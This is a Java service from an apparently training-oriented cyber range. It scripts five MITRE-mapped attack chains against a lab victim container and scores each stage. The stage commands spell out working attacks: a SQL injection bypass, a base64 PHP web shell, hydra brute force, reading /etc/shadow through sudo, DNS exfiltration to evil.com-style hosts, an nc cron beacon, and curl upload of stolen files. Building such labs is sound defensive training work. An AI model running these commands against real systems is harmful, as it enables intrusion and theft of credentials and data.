package com.minisoc.lab.service;

import com.minisoc.lab.executor.SystemCommandExecutor;
import com.minisoc.lab.model.AttackSession;
import com.minisoc.lab.model.AttackVector;
import com.minisoc.lab.model.AttackVector.KillChainStage;
import com.minisoc.lab.model.CommandResult;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import org.springframework.beans.factory.annotation.Value;
import org.springframework.stereotype.Service;

import java.time.Instant;
import java.util.*;
import java.util.concurrent.ConcurrentHashMap;

/**
 * Manages attack vectors, sessions, and kill chain progression.
 * Maps MITRE ATT&CK techniques to executable payloads and tracks scoring.
 */
@Service
public class AttackVectorService {

    private static final Logger log = LoggerFactory.getLogger(AttackVectorService.class);

    private final SystemCommandExecutor commandExecutor;
    private final SimulationService simulationService;

    @Value("${cyber-range.victim.container:soc-victim}")
    private String victimContainer;

    @Value("${cyber-range.attacker.container:soc-attacker}")
    private String attackerContainer;

    private final Map<String, AttackVector> vectors = new LinkedHashMap<>();
    private final Map<String, AttackSession> sessions = new ConcurrentHashMap<>();

    public AttackVectorService(SystemCommandExecutor commandExecutor,
                               SimulationService simulationService) {
        this.commandExecutor = commandExecutor;
        this.simulationService = simulationService;
        initializeVectors();
    }

    private void initializeVectors() {
        // Vector 1: Web Application Exploitation (SQLi → RCE → Persistence)
        vectors.put("web-sqli", new AttackVector("web-sqli",
                "Web Application Exploitation",
                "SQL injection to RCE to persistence via vulnerable PHP app",
                List.of(
                        new KillChainStage(1, "recon", "Web Reconnaissance",
                                "T1595", "Active Scanning", "Reconnaissance",
                                "nmap -sV victim -p 80 && curl -s http://victim/index.php | head -20",
                                "soc-attacker", 10, List.of(),
                                Map.of("logSource", "APACHE", "hint", "Look for scanning patterns in access logs")),
                        new KillChainStage(2, "sqli", "SQL Injection",
                                "T1190", "Exploit Public-Facing Application", "Initial Access",
                                "curl -s 'http://victim/index.php' -d \"username=admin' OR '1'='1'-- -&password=x\"",
                                "soc-attacker", 20, List.of("recon"),
                                Map.of("logSource", "APACHE", "hint", "SQL keywords in request parameters")),
                        new KillChainStage(3, "rce", "Remote Code Execution",
                                "T1059.004", "Unix Shell", "Execution",
                                "curl -s 'http://victim/admin.php?cmd=id' && curl -s 'http://victim/admin.php?cmd=cat+/etc/passwd'",
                                "soc-attacker", 25, List.of("sqli"),
                                Map.of("logSource", "APACHE", "hint", "Shell commands in HTTP parameters")),
                        new KillChainStage(4, "persist-web", "Web Shell Persistence",
                                "T1505.003", "Web Shell", "Persistence",
                                "curl -s 'http://victim/admin.php?cmd=echo+PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOyA/Pg==+|+base64+-d+>+/var/www/html/uploads/shell.php'",
                                "soc-attacker", 30, List.of("rce"),
                                Map.of("logSource", "APACHE", "hint", "Base64 encoded content, new PHP files in uploads"))
                )));

        // Vector 2: SSH Brute Force → Privilege Escalation
        vectors.put("ssh-bruteforce", new AttackVector("ssh-bruteforce",
                "SSH Brute Force Attack",
                "Brute force SSH credentials then escalate privileges via sudo misconfiguration",
                List.of(
                        new KillChainStage(1, "ssh-scan", "SSH Service Discovery",
                                "T1046", "Network Service Scanning", "Discovery",
                                "nmap -sV victim -p 22",
                                "soc-attacker", 10, List.of(),
                                Map.of("logSource", "SSH", "hint", "Connection attempts from attacker IP")),
                        new KillChainStage(2, "ssh-brute", "SSH Credential Brute Force",
                                "T1110.001", "Password Guessing", "Credential Access",
                                "hydra -L /opt/wordlists/users.txt -P /opt/wordlists/passwords.txt ssh://victim -t 4 -f",
                                "soc-attacker", 25, List.of("ssh-scan"),
                                Map.of("logSource", "SSH", "hint", "Multiple failed login attempts followed by success")),
                        new KillChainStage(3, "ssh-login", "SSH Access with Stolen Credentials",
                                "T1078", "Valid Accounts", "Initial Access",
                                "sshpass -p 'www-data' ssh -o StrictHostKeyChecking=no www-data@victim 'whoami && id'",
                                "soc-attacker", 15, List.of("ssh-brute"),
                                Map.of("logSource", "SSH", "hint", "Successful login after brute force attempts")),
                        new KillChainStage(4, "privesc", "Privilege Escalation via Sudo",
                                "T1548.003", "Sudo and Sudo Caching", "Privilege Escalation",
                                "sshpass -p 'www-data' ssh -o StrictHostKeyChecking=no www-data@victim 'sudo /bin/bash -c \"whoami && id && cat /etc/shadow | head -3\"'",
                                "soc-attacker", 30, List.of("ssh-login"),
                                Map.of("logSource", "AUDIT", "hint", "sudo invocation by non-root user"))
                )));

        // Vector 3: DNS-based Attack
        vectors.put("dns-exfil", new AttackVector("dns-exfil",
                "DNS Tunneling & Exfiltration",
                "Use DNS queries to exfiltrate data from victim network",
                List.of(
                        new KillChainStage(1, "dns-recon", "DNS Reconnaissance",
                                "T1018", "Remote System Discovery", "Discovery",
                                "dig @victim minisoc.local ANY && nslookup victim victim",
                                "soc-attacker", 10, List.of(),
                                Map.of("logSource", "DNS", "hint", "Unusual DNS query types (ANY, AXFR)")),
                        new KillChainStage(2, "dns-tunnel", "DNS Tunneling Setup",
                                "T1572", "Protocol Tunneling", "Command and Control",
                                "for i in $(seq 1 10); do dig @victim $(echo \"secret-data-chunk-$i\" | base64).exfil.attacker.com; done",
                                "soc-attacker", 25, List.of("dns-recon"),
                                Map.of("logSource", "DNS", "hint", "Base64-encoded subdomain queries, high query volume")),
                        new KillChainStage(3, "dns-exfil", "Data Exfiltration via DNS",
                                "T1048.003", "Exfiltration Over Unencrypted Non-C2 Protocol", "Exfiltration",
                                "sshpass -p 'password123' ssh -o StrictHostKeyChecking=no victim@victim 'cat /home/victim/sensitive_data/employee_records.csv | base64 | fold -w 60 | while read line; do dig @localhost $line.exfil.evil.com +short 2>/dev/null; done'",
                                "soc-attacker", 35, List.of("dns-tunnel"),
                                Map.of("logSource", "DNS", "hint", "Long base64-encoded subdomains in DNS queries"))
                )));

        // Vector 4: Cron-based Persistence & Lateral Movement
        vectors.put("cron-persist", new AttackVector("cron-persist",
                "Cron Job Persistence",
                "Install persistent backdoor via cron and attempt lateral movement",
                List.of(
                        new KillChainStage(1, "cron-enum", "Cron Job Enumeration",
                                "T1053.003", "Cron", "Discovery",
                                "sshpass -p 'www-data' ssh -o StrictHostKeyChecking=no www-data@victim 'crontab -l 2>/dev/null; ls -la /etc/cron* /var/spool/cron/ 2>/dev/null'",
                                "soc-attacker", 10, List.of(),
                                Map.of("logSource", "AUDIT", "hint", "Enumeration of cron directories")),
                        new KillChainStage(2, "cron-install", "Install Malicious Cron Job",
                                "T1053.003", "Cron", "Persistence",
                                "sshpass -p 'www-data' ssh -o StrictHostKeyChecking=no www-data@victim '(crontab -l 2>/dev/null; echo \"*/2 * * * * /bin/bash -c \\\"echo beacon | nc -w 2 soc-attacker 4444 2>/dev/null\\\"\") | crontab -'",
                                "soc-attacker", 25, List.of("cron-enum"),
                                Map.of("logSource", "CRON", "hint", "New cron job with network connection")),
                        new KillChainStage(3, "lateral-scan", "Internal Network Scanning",
                                "T1046", "Network Service Scanning", "Discovery",
                                "sshpass -p 'www-data' ssh -o StrictHostKeyChecking=no www-data@victim 'for h in backend soc-attacker; do for p in 22 80 8080 3306; do (echo scan | nc -w 1 $h $p 2>/dev/null && echo \"OPEN:$h:$p\") & done; done; wait'",
                                "soc-attacker", 20, List.of("cron-install"),
                                Map.of("logSource", "NETWORK", "hint", "Port scanning from victim to internal hosts"))
                )));

        // Vector 5: Data Exfiltration via File Theft
        vectors.put("data-exfil", new AttackVector("data-exfil",
                "Sensitive Data Exfiltration",
                "Locate and exfiltrate sensitive files from victim",
                List.of(
                        new KillChainStage(1, "file-enum", "Sensitive File Discovery",
                                "T1083", "File and Directory Discovery", "Discovery",
                                "sshpass -p 'password123' ssh -o StrictHostKeyChecking=no victim@victim 'find / -name \"*.csv\" -o -name \"*.env\" -o -name \"*.key\" -o -name \"*.pem\" -o -name \"config.*\" 2>/dev/null | head -20'",
                                "soc-attacker", 10, List.of(),
                                Map.of("logSource", "AUDIT", "hint", "Broad file system enumeration with find")),
                        new KillChainStage(2, "cred-harvest", "Credential Harvesting",
                                "T1552.001", "Credentials In Files", "Credential Access",
                                "sshpass -p 'password123' ssh -o StrictHostKeyChecking=no victim@victim 'cat /var/www/html/.env /var/www/html/config.php /home/victim/.env 2>/dev/null'",
                                "soc-attacker", 20, List.of("file-enum"),
                                Map.of("logSource", "AUDIT", "hint", "Reading of credential/config files")),
                        new KillChainStage(3, "db-dump", "Database Dump",
                                "T1005", "Data from Local System", "Collection",
                                "sshpass -p 'password123' ssh -o StrictHostKeyChecking=no victim@victim 'mysql -u root -e \"SELECT * FROM victim_db.users; SELECT * FROM victim_db.sensitive_data;\" 2>/dev/null'",
                                "soc-attacker", 25, List.of("cred-harvest"),
                                Map.of("logSource", "AUDIT", "hint", "MySQL client invocation, database access")),
                        new KillChainStage(4, "exfil-http", "HTTP Exfiltration",
                                "T1048.003", "Exfiltration Over Unencrypted Non-C2 Protocol", "Exfiltration",
                                "sshpass -p 'password123' ssh -o StrictHostKeyChecking=no victim@victim 'tar czf /tmp/.data.tar.gz /home/victim/sensitive_data/ 2>/dev/null && curl -s -X POST http://soc-attacker:8888/upload -F \"file=@/tmp/.data.tar.gz\" 2>/dev/null || echo exfil_attempted'",
                                "soc-attacker", 30, List.of("db-dump"),
                                Map.of("logSource", "NETWORK", "hint", "Large outbound data transfer, tar/compression"))
                )));
    }

    // ===== Vector queries =====

    public List<AttackVector> getAllVectors() {
        return new ArrayList<>(vectors.values());
    }

    public AttackVector getVector(String vectorId) {
        return vectors.get(vectorId);
    }

    // ===== Session management =====

    public AttackSession startSession(String vectorId) {
        AttackVector vector = vectors.get(vectorId);
        if (vector == null) return null;

        AttackSession session = new AttackSession(vectorId);
        sessions.put(session.getSessionId(), session);
        simulationService.pushLog("RED", "Attack session started: " + vector.getName() +
                " [" + session.getSessionId() + "]");
        log.info("Attack session started: {} → {}", vectorId, session.getSessionId());
        return session;
    }

    public AttackSession getSession(String sessionId) {
        return sessions.get(sessionId);
    }

    public List<AttackSession> getAllSessions() {
        return new ArrayList<>(sessions.values());
    }

    /**
     * Execute the next stage in a session's kill chain.
     * Returns the result or null if no next stage is available.
     */
    public Map<String, Object> executeNextStage(String sessionId) {
        AttackSession session = sessions.get(sessionId);
        if (session == null) return Map.of("success", false, "reason", "Session not found");
        if (session.getStatus() != AttackSession.SessionStatus.ACTIVE) {
            return Map.of("success", false, "reason", "Session not active: " + session.getStatus());
        }

        AttackVector vector = vectors.get(session.getVectorId());
        if (vector == null) return Map.of("success", false, "reason", "Vector not found");

        List<KillChainStage> chain = vector.getKillChain();
        int idx = session.getCurrentStageIndex();
        if (idx >= chain.size()) {
            session.setStatus(AttackSession.SessionStatus.COMPLETED);
            session.setEndTime(Instant.now());
            return Map.of("success", false, "reason", "All stages completed");
        }

        KillChainStage stage = chain.get(idx);

        // Check prerequisites
        for (String prereq : stage.getPrerequisites()) {
            if (!session.isStageCompleted(prereq)) {
                return Map.of("success", false, "reason",
                        "Prerequisite not met: " + prereq);
            }
        }

        // Execute the command
        String target = stage.getTargetContainer();
        log.info("Executing stage {}/{}: {} on {}", idx + 1, chain.size(), stage.getName(), target);

        CommandResult result = commandExecutor.execute(target, stage.getCommand());

        String output = result.stdout();
        if (output.length() > 2000) output = output.substring(0, 2000) + "...(truncated)";

        int points = result.success() ? stage.getPoints() : stage.getPoints() / 4;
        session.completeStage(stage.getStageId(), points, output);
        session.setCurrentStageIndex(idx + 1);

        // Add to red team score
        simulationService.getGameState().addRedScore(points);
        simulationService.pushLog("RED", String.format("[%s] %s (%s) → %s (+%d pts)",
                stage.getMitreId(), stage.getName(), stage.getMitreTactic(),
                result.success() ? "SUCCESS" : "PARTIAL", points));

        // Check if chain is complete
        if (idx + 1 >= chain.size()) {
            session.setStatus(AttackSession.SessionStatus.COMPLETED);
            session.setEndTime(Instant.now());
            simulationService.pushLog("RED", "Kill chain COMPLETE for " + vector.getName() +
                    " — Total: " + session.getTotalScore() + " pts");
        }

        return Map.of(
                "success", result.success(),
                "sessionId", session.getSessionId(),
                "stage", Map.of(
                        "stageId", stage.getStageId(),
                        "name", stage.getName(),
                        "mitreId", stage.getMitreId(),
                        "mitreTactic", stage.getMitreTactic(),
                        "order", stage.getOrder(),
                        "totalStages", chain.size()
                ),
                "output", output,
                "points", points,
                "totalScore", session.getTotalScore(),
                "completed", idx + 1 >= chain.size(),
                "nextStage", idx + 1 < chain.size() ? chain.get(idx + 1).getName() : "DONE"
        );
    }

    /**
     * Execute a specific stage by stageId (for non-linear progression).
     */
    public Map<String, Object> executeStage(String sessionId, String stageId) {
        AttackSession session = sessions.get(sessionId);
        if (session == null) return Map.of("success", false, "reason", "Session not found");

        AttackVector vector = vectors.get(session.getVectorId());
        if (vector == null) return Map.of("success", false, "reason", "Vector not found");

        KillChainStage stage = vector.getKillChain().stream()
                .filter(s -> s.getStageId().equals(stageId))
                .findFirst().orElse(null);
        if (stage == null) return Map.of("success", false, "reason", "Stage not found: " + stageId);

        if (session.isStageCompleted(stageId)) {
            return Map.of("success", false, "reason", "Stage already completed");
        }

        for (String prereq : stage.getPrerequisites()) {
            if (!session.isStageCompleted(prereq)) {
                return Map.of("success", false, "reason", "Prerequisite not met: " + prereq);
            }
        }

        String target = stage.getTargetContainer();
        CommandResult result = commandExecutor.execute(target, stage.getCommand());

        String output = result.stdout();
        if (output.length() > 2000) output = output.substring(0, 2000) + "...(truncated)";

        int points = result.success() ? stage.getPoints() : stage.getPoints() / 4;
        session.completeStage(stage.getStageId(), points, output);

        simulationService.getGameState().addRedScore(points);
        simulationService.pushLog("RED", String.format("[%s] %s → %s (+%d pts)",
                stage.getMitreId(), stage.getName(),
                result.success() ? "SUCCESS" : "PARTIAL", points));

        return Map.of(
                "success", result.success(),
                "sessionId", session.getSessionId(),
                "stageId", stageId,
                "name", stage.getName(),
                "mitreId", stage.getMitreId(),
                "output", output,
                "points", points,
                "totalScore", session.getTotalScore()
        );
    }
}
